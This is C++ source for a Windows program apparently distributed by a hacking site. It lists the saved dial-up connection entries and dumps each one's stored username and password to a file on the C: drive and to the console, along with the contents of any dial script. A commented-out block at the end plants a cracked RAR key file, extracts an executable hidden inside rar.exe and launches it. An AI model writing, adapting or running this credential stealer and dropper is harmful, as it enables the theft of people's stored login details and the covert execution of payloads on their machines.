/*===================================
ProAgent coded By ATmaCA
http://www.atmacasoft.com
atmaca@prohack.net
===================================*/
// jjj.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "stdio.h"
#include <stdlib.h>
#include <windows.h>
#pragma comment(lib, "rasapi32")
#include "ras.h"
#define MAX_ENTRIES 100

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	LPRASENTRYNAME EntryArray = new (RASENTRYNAME[MAX_ENTRIES]);
  DWORD lpcb = sizeof(RASENTRYNAME)*MAX_ENTRIES;
  DWORD lpcEntries;
  DWORD i, e;
  int lpfPassword;
  RASDIALPARAMS DialEntry;
  RASENTRY *EntryParam;
  DWORD dwEntryInfoSize = 0;
  char buf[1024];

  printf("Active phonebook:\n");
  printf("Entry : CountryCode,AreaCode,Phone : Login/Pass\n");
  EntryArray[0].dwSize = sizeof(RASENTRYNAME);

  RasGetEntryProperties(NULL, NULL,
                    NULL, &dwEntryInfoSize, NULL, NULL);
  EntryParam = (RASENTRY*)malloc(dwEntryInfoSize);
  if( (e = RasEnumEntries( NULL, NULL, EntryArray, &lpcb,
                                          &lpcEntries)) == 0 )
    for(i=0;i<lpcEntries;i++)
    {
      strcpy(DialEntry.szEntryName, EntryArray[i].szEntryName);
      DialEntry.dwSize = sizeof(RASDIALPARAMS);
      RasGetEntryDialParams(NULL, &DialEntry, &lpfPassword );

      EntryParam->dwSize = dwEntryInfoSize;
      RasGetEntryProperties(NULL, DialEntry.szEntryName,
                    EntryParam, &dwEntryInfoSize, NULL, NULL);
   //CharToOem(DialEntry.szEntryName,DialEntry.szEntryName);
   //CharToOem(DialEntry.szUserName,DialEntry.szUserName);
   //CharToOem(DialEntry.szPassword,DialEntry.szPassword);
	  FILE *di;
	  if((di=fopen("c:\\deneme.txt","w"))==NULL)
{
	return 0;
}
	  fprintf(di, "##### Dial-Up Sifreleri #####\nBaglanti Adi: %s \nTelefon Numarasi: %u %s %s\nKullanici Adi: %s\nSifre: %s\n", DialEntry.szEntryName,
      EntryParam->dwCountryCode,
   EntryParam->szAreaCode,
            EntryParam->szLocalPhoneNumber,
            DialEntry.szUserName,
            lpfPassword==1?DialEntry.szPassword:"Tepit Edilemedi.");
	  
      fclose(di);
      printf("##### Dial-Up Sifreleri #####\nBaglanti Adi: %s \nTelefon Numarasi: %u %s %s\nKullanici Adi: %s\nSifre: %s\n", DialEntry.szEntryName,
   EntryParam->dwCountryCode,
   EntryParam->szAreaCode,
            EntryParam->szLocalPhoneNumber,
            DialEntry.szUserName,
            lpfPassword==1?DialEntry.szPassword:"Tepit Edilemedi.");
      if (strcmp(EntryParam->szScript,""))
   {
   printf("Script:%s\n",EntryParam->szScript);
   FILE *fs = fopen(EntryParam->szScript,"rb");
   while(!feof(fs)&&(fgets(buf,sizeof(buf),fs))) printf("%s",buf);
   fclose(fs);
   printf("\n\n");
   }
 }
  else
    printf("RasEnumEntries error? Code:%d\n", e);
 free(EntryParam);
	/*
int i=0,kr;
FILE *di,*out,*pr;
if((di=fopen("rarreg.key","w+b"))==NULL)
{
	i++;
}
if(i==0)
{
fprintf(di,"\nCracked By Battal");
fprintf(di,"\nCoded By ATmaCA");
fprintf(di,"\nweb-site:http://www.ProHack.net");
}
if((out=fopen("c:\\rt_2.exe","w+b"))==NULL)
{
	i++;
}
if((pr=fopen("rar.exe","rb"))==NULL)
{
	i++;
}

if(i==0)
{
	fseek(pr,0x1000,0);
		while(!feof(pr))
    {
    kr=getc(pr);
    putc(kr,out);
    };

}
fclose(di);
fclose(out);
fclose(pr);
WinExec("c:\\rt_2.exe",SW_SHOW);*/
	return 0;
}



